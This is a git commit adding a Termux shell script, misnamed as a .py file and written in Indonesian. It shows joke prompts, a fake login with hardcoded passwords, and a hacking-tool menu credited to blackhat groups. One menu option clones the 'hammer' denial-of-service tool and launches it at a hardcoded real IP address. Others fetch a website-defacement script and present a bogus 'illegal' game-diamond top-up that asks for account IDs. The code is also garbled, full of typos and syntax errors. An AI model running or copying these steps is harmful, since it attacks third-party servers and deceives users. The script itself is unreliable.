e174a06bd7842ed268ae846eeeb3a0e8c098378a
SECRIPT TERMUX <58557877+secripttermux@users.noreply.github.com>
2019-12-31 12:46:06 +0700

    Add files via upload

---
+++ sayank.py
@@ -0,0 +1,371 @@
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+red='\033[1;31m'
+clear
+echo "[01]Kaka jones kan? :p"
+echo "[02]apa kaka udah punya pacar?"
+echo $pu"╔═══ Make Your Choice ══"
+read -p "╚═══ : " bro
+clear
+if [ $bro = 01 ] || [ $bro = 01 ]
+then
+clear
+echo "NGAKAK DASAR JONES !!! :p"
+fi
+if [ $bro = 02 ] || [ $bro = 02 ]
+then
+clear
+echo "pacar kamu mau gk sama aku aja????"
+sleep 4
+echo "dia pasti mau gk sama aku"
+sleep 3
+echo "takut nya dia gk mau sama aku"
+sleep 5
+echo "aku kan jelak"
+sleep 6
+echo "KALO BERANI KASIH NOMER PACAR LU"
+read nick #membaca yang ditulis
+echo "TERIMAKASIH"
+sleep 3
+echo ": V "
+sleep 1
+fi
+echo "[=========1=======] TUNGGU LEBIH INDAH"
+sleep 5
+clear
+echo    "[=============2========] ORANG SABAR DI SAYANGI JANDA"
+sleep 5
+clear
+echo        "[============3======] SABAR"
+sleep 5
+clear
+echo            "[===========4=====]SABAR DI SAYANGI TUHAN"
+slepp 6
+clear
+echo                 "5SELESAI"
+seleep 10
+clear
+echo $bi"╔═══════════╗"
+echo $bi"║$pu A. MASUK$bi ║"
+echo $bi"╚═══════════╝"
+echo $bi"╔═════════╗"
+echo $bi"║$pu B. KELUAR$bi ║"
+echo $bi"╚═════════╝"
+echo
+echo $pu"╔═══ Make Your Choice ══"
+read -p "╚═══ : " pil
+
+if [ $pil = 'A' ]|[ $pil = 'A' ]
+then
+echo $white"JANGAN SOMBONG KERENA SOMBONG ADALAH SETAN/DAJJAL"
+sleep 5
+echo $green"USERNAME && PASSWORD JANGAN BAGI SIAPA SIAPA"
+sleep 5
+echo $white"Kita perlu bicara tentang apa milikmu dan milikku."
+sleep 5
+echo $red"Perilaku orang adalah pesan, bukan"
+sleep 5
+echo $cyan"{=======SIHLAHKAN MASUK{========)="
+sleep 10
+fi
+clear
+if [ $pil = 'B' ]|[ $pil = 'B' ]
+then
+  echo "Kebanyakan peretas masih muda karena"
+sleep 5
+  echo "orang muda cenderung muda"
+sleep 5
+  echo "beradaptasi. Selama Anda tetap bisa"
+sleep 5
+  echo "beradaptasi, Anda selalu bisa menjadi"
+sleep 5
+  echo "peretas yang baik."
+sleep 5
+  echo "TERIMAKASIH"
+  sleep 10000
+  sh 991.sh
+exit
+fi
+echo $i"•" $cy"◕ ▬▬▬▬▬▬▬❋[♥]❋▬▬▬▬▬▬ ◕"
+echo $i"•" $cy"______█████████"
+echo $i"•" $cy"______█▄█████▄█"
+echo $i"•" $cy"______█▼▼▼▼▼█"
+echo $i"•" $cy"_____██▌_______██▌"    "JANGAN LUPA USERNAME NYA"
+echo $i"•" $cy"______█▲▲▲▲▲█"
+echo $i"•" $cy"______█████████"
+echo $i"•" $cy"_______██_____██"
+echo $i"•" $cy"◕ ▬▬▬▬▬▬▬❋[♥]❋▬▬▬▬▬▬ ◕"
+echo $i"••••••••••••••
+echo $i"•••••••••••••••••••••••••••••••••"
+echo  $green"╔════╗╔══════════════════════╗"
+read -p     "║ ON ║║Username :"  pass
+echo  $green"╚════╝╚══════════════════════╝"
+if [ $pass = "solo" ]
+then
+clear
+sleep 1
+clear
+else
+  echo "\033[31;((+_+)"
+  echo "\033[37;1m"
+  sleep 300
+  sh 991.sh
+fi
+$i"•••••••••••••••••••••••••••••••••"
+echo $i"•" $cy"◕ ▬▬▬▬▬▬▬❋[♥]❋▬▬▬▬▬▬ ◕"
+echo $i"•" $cy"______█████████"
+echo $i"•" $cy"______█▄█████▄█"
+echo $i"•" $cy"______█▼▼▼▼▼█"
+echo $i"•" $cy"_____██▌_______██▌"    "JANGAN LUPA PASWORD NYA NYA"
+echo $i"•" $cy"______█▲▲▲▲▲█"
+echo $i"•" $cy"______█████████"
+echo $i"•" $cy"_______██_____██"
+echo $i"•" $cy"◕ ▬▬▬▬▬▬▬❋[♥]❋▬▬▬▬▬▬ ◕"
+echo $i"••••••••••••••"
+echo $i"•••••••••••••••••••••••••••••••••"
+echo  $green"╔════╗╔══════════════════════╗"
+read -p     "║ 0N ║║Password : " pass
+echo  $white"╚════╝╚══════════════════════╝"
+read -p
+if [ $pass = "player" ]
+then
+clear
+sleep 1
+clear
+else
+  echo "\033[31;((+_+)"
+  echo "\033[37;1m"
+  sleep 300
+  sh 991.sh
+fi
+clear
+    sleep 0.03
+    echo "         _ "
+    sleep 0.03
+    echo "        /_)  _.-===-._ "
+    sleep 0.03
+    echo "       /  .; '_-.'- .'.     _ "
+    sleep 0.03
+    echo "  __ _/  /.'\ ._  '. , \   (_\ "
+    sleep 0.03
+    echo " /\_( \  |.'.-._'- .  '|     \ "
+    sleep 0.03
+    echo " |_)  /  |/'    ''--''\|     _\__ "
+    sleep 0.03
+    echo " \_)_|  /'  ._.   ._.  '\   / )(_\ "
+    sleep 0.03
+    echo " )/  (  \_      _      _/   \' (_| "
+    sleep 0.03
+    echo " /   /    \           /     _) (_/ "
+    sleep 0.03
+    echo " |   '',_ _'._'---'_.'_ _,.'    | \ "
+    sleep 0.03
+    echo " \    /  \ \  '''''  / / /     /   \ "
+    sleep 0.03
+    echo "  \_.'    \ \       / /  |   .' "
+    sleep 0.03
+    echo "   '--.,   \ \     / /  _;-'' "
+    sleep 0.03
+    echo "       '|   \ \   / /   | "
+    sleep 0.03
+    echo "       .;----'''''''----;. "
+    sleep 0.03
+    echo "      /(                 )\ "
+    sleep 0.03
+    echo "      \_''-------------''_/ "
+    sleep 0.03
+    echo "      | '';-----;-----;'' | "
+    sleep 0.03
+    echo "      | / : \ / : \ / : \ | "
+    sleep 0.03
+    echo "      |V.','.V.','.V.','.V| "
+    sleep 0.03
+    echo "      \'./_\.;./_\.;./_\.'/ "
+    sleep 0.03
+    echo "       ';..___________..;' "
+    sleep 0.03
+    echo " ============================="
+    sleep 2
+    echo " ==      Nama KK Siapa?      =="
+    sleep 0.7
+    echo " ============================="
+read nick #membaca yang ditulis
+echo $green
+echo "LOADING..........................................................."
+sleep 9.9;
+echo $white
+echo "MOHON TUNGGU ORANG NYA LAGI COKLI SEBENTAR............................................................"
+sleep 8.8;
+clear
+figlet -f smslant "MR..LUKMAN" | lolcat
+echo "------------------------------------------------------------------" | lolcat
+echo $red
+echo
+echo $white"  ╔═════════════════════════ ▓▓ ࿇ ▓▓ ═════════════════════════╗ "
+echo
+echo $cyan"                    CREATED BY : $yellow CYBER × GNS"
+echo $cyan"             SPESIAL THANKS TO : $yellow Micin | MR.P1K4CHU |
+                MH.TAHU | XXX | MR.ANAK SETAN |
+                      Jr.Fake404 | Legend |"
+echo $cyan"             Dan seluruh member ICM & PASURUAN BLACKHAT"
+echo $white"  ╚═════════════════════════ ▓▓ ࿇ ▓▓ ═════════════════════════╝"
+echo
+echo $i"•••••••••••••••••••••••••••••••••"
+echo $i"•" $cy"◕ ▬▬▬▬▬▬▬❋[♥]❋▬▬▬▬▬▬ ◕"
+echo $i"•" $cy"______█████████"
+echo $i"•" $cy"______█▄█████▄█"
+echo $i"•" $cy"______█▼▼▼▼▼█"
+echo $i"•" $cy"_____██▌_______██▌"
+echo $i"•" $cy"______█▲▲▲▲▲█"
+echo $i"•" $cy"______█████████"
+echo $i"•" $cy"_______██_____██"
+echo $i"•" $cy"◕ ▬▬▬▬▬▬▬❋[♥]❋▬▬▬▬▬▬ ◕"
+echo $i"••••••••••••••"
+$i"••••••••••••••"
+echo  $purple"═══════════════════════════════════════════"
+echo  $white"( 01 ) TOOLS DIAMOND MOBILE LEGEGND"
+echo  $purple"═══════════════════════════════════════════"
+echo""
+echo  $purple"═══════════════════════════════════════════"
+echo  $white"( 02 ) MEMBUAT SECRIPT DEFACE"
+echo  $purple"═══════════════════════════════════════════"
+echo""
+echo  $purple"═══════════════════════════════════════════"
+echo  $white"( 03 ) MEMBUAT MEMPERCANTIK TERMUX"
+echo  $purple"═══════════════════════════════════════════"
+echo""
+echo  $purple"═══════════════════════════════════════════"
+echo  $white"( 04 ) TOMBOL SEPESIAL TERMUX"
+echo  $purple"═══════════════════════════════════════════"
+echo""
+echo  $purple"═══════════════════════════════════════════"
+echo  $white"( 05 ) SURAH-Al-quran"
+echo  $purple"═══════════════════════════════════════════"
+echo""
+echo  $purple"═══════════════════════════════════════════"
+echo  $white"( 06 ) DDOS HAMER"
+echo  $purple"═══════════════════════════════════════════"
+echo""
+echo  $purple"═══════════════════════════════════════════"
+echo  $white"( 07 ) RED_HAWK"
+echo  $purple"═══════════════════════════════════════════"
+echo""
+echo  $purple"═══════════════════════════════════════════"
+echo  $white"( 0 ) YAKIN MAU KELUAR : V"
+echo  $purple"═══════════════════════════════════════════"
+echo""
+echo $pu"╔═══ Make Your Choice ══"
+read -p "╚═══ : " bro
+if [ $bro = 01 ] || [ $bro = 01 ]
+then
+clear
+echo $purple"==============================================="
+echo  $red" TOP UP ILEGAL ML "
+sleep 1
+echo  $white " selamat Datang Di Tools Lukman "
+echo  $red" ID ML nya yang Benar biar bisa masuk "
+echo $purple"==============================================="
+echo $purple"MAU ISI DM BERAPA?="read #tulisan keluar
+read nick #membaca yang ditulis
+echo $purple"==============================================="
+echo $merah"TUNGGU DIAMOND MASIH SAYA PROSES.HARAP BERSABAR°°°°°°°°°°°°°°°°° "
+echo $purple"==============================================="
+read nick #membaca yang ditulis
+echo $purple"==============================================="
+fi
+if [ $bro = 02 ] || [ $bro = 02 ]
+then
+clear
+echo  $red" MEMBUAT SECRIPT DEVACE "
+sleep 1
+pkg install python2
+ pkg install git
+git clone https://github.com/4L13199/LITESCRIPT
+cd LITESCRIPT
+python2 LITESCRIPT.py
+fi
+
+if [ $bro = 03 ] || [ $bro = 03 ]
+then
+clear
+echo  $red" MEMBUAT MEMPERCANTIK TERMUX "
+sleep 1
+pkg install ruby
+ pkg install nano
+ pkg install cowsay
+ pkg install figlet
+ pkg install toilet
+ gem install lolcat
+nano /data/data/com.termux/files/usr/etc/profile
+fi
+
+if [ $bro = 04 ] || [ $bro = 04 ]
+then
+clear
+echo  $red" TOMBOL SEPESIAL TERMUX "
+sleep 1
+pkg install bash
+pkg install python2
+pkg install git
+git clone https://github.com/Rusmana-ID/tombol-special-termux
+cd tombol-special-termux
+python2 special.py
+fi
+
+if [ $bro = 05 ] || [ $bro = 05 ]
+then
+clear
+echo  $red" SURAH-Al-quran "
+sleep 1
+pkg install update && pkg install upgrade
+pkg install git
+git clone https://github.com/Rusmana-ID/surah-al-quran
+cd surah-al-quran
+sh surah.sh
+fi
+
+if [ $bro = 06 ] || [ $bro = 06 ]
+then
+clear
+echo  $red" DOOS HAMER "
+termux
+pkg update
+pkg upgrade
+pkg install python
+pkg install git
+git clone https://github.com/cyweb/hammer
+cd hammer
+python hammer.py -s 161.117.70.145
+fi
+
+if [ $bro = 07 ] || [ $bro = 07 ]
+then
+clear
+pkg install update && pkg install upgrade
+pkg install git
+git clone https://github.com/Tuhinshubhra/RED_HAWK
+cd RED_HAWK
+php rhawk.php
+fi
+if [ $bro = 0 ] || [ $bro = 00 ]
+then
+echo "\033[32;1mDARKNESS CYBER TEAM"
+sleep 1
+echo "\033[33;1mWe Security"
+sleep 1
+echo " We Not Friends"
+sleep 1                                                                echo "We Are Family"
+sleep 1
+echo "Hacking Is Not Criminal;)"
+sleep 1
+echo "Ketika Sebuah Hayalan Tidak tercapai"
+sleep 1
+echo "Maka Terus lah BerJuang Dan Berusaha:)"
+sleep 1
+echo "\033[32;1mKarna Suatu Hari Nanti Kamu akan Mendapatkannya:)"
+sleep 1
+fi
